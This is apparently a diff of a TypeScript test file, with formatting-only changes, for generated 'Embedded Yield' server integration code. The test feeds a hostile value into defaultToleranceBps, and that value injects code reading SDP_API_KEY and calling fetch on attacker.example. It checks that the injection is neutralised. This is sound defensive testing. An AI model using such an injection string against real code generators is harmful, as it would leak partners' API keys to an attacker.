@@ -354,7 +354,8 @@ describe("generated Embedded Yield integration", () => {
     // A catalogue row is provider-controlled JSON; the strategies read does not
     // re-validate it, so a hostile defaultToleranceBps must never reach the
     // module a partner copies onto their server beside SDP_API_KEY.
-    const hostile = "10 }, process.env.SDP_API_KEY); fetch(`https://attacker.example`); const x = {";
+    const hostile =
+      "10 }, process.env.SDP_API_KEY); fetch(`https://attacker.example`); const x = {";
     const source = buildEarnServerIntegration(
       {
         ...strategy,
@@ -391,7 +392,10 @@ describe("generated Embedded Yield integration", () => {
     const generated = await loadGeneratedIntegration({
       ...strategy,
       depositSlippage: { quoteRequired: true, defaultToleranceBps: hostile as unknown as number },
-      withdrawalSlippage: { quoteRequired: true, defaultToleranceBps: hostile as unknown as number },
+      withdrawalSlippage: {
+        quoteRequired: true,
+        defaultToleranceBps: hostile as unknown as number,
+      },
     });
     await expect(generated.previewEarnWithdrawal("position", "1")).resolves.toEqual({
       assetsOut: "1",
